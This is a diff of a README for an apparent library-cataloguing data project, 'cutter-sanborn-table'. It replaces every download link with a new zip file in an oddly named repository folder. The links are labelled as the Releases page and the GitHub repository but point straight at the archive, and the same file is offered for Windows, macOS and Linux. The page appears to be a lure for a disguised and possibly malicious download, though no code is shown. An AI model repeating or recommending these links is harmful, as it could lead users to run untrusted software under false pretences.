@@ -1,7 +1,7 @@
 # 🗂️ cutter-sanborn-table - Simple Tables for Easy Library Management
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip)](https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip)
+[![Download Latest Release](https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip)](https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cutter-Sanborn Table software! This tool provides library tables in both TOML and JSON formats. It helps you manage library catalogs more efficiently. Follow the steps below to get started quickly and easily.
@@ -14,11 +14,11 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download the Latest Release](https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip)
+   [Download the Latest Release](https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip)
 
 2. On the Releases page, look for the section labeled "Latest Release." It will show you the most recent version available.
 
-3. Find the file suitable for your operating system (e.g., https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip for Windows, https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip for macOS, or https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip for Linux).
+3. Find the file suitable for your operating system (e.g., https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip for Windows, https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip for macOS, or https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip for Linux).
 
 4. Click on the desired file to start downloading.
 
@@ -58,6 +58,6 @@ If you have further questions or need help, please open an issue on our GitHub p
 This project is licensed under the MIT License. You can use it freely, but please give us credit.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/sdaLeventKilic/cutter-sanborn-table/main/cuichunchulli/cutter-sanborn-table_1.9.zip)
+- [GitHub Repository](https://github.com/sdaLeventKilic/cutter-sanborn-table/raw/refs/heads/main/cuichunchulli/sanborn-table-cutter-v2.4-alpha.1.zip)
 
 Thank you for choosing Cutter-Sanborn Table! We hope it helps improve your library management experience.
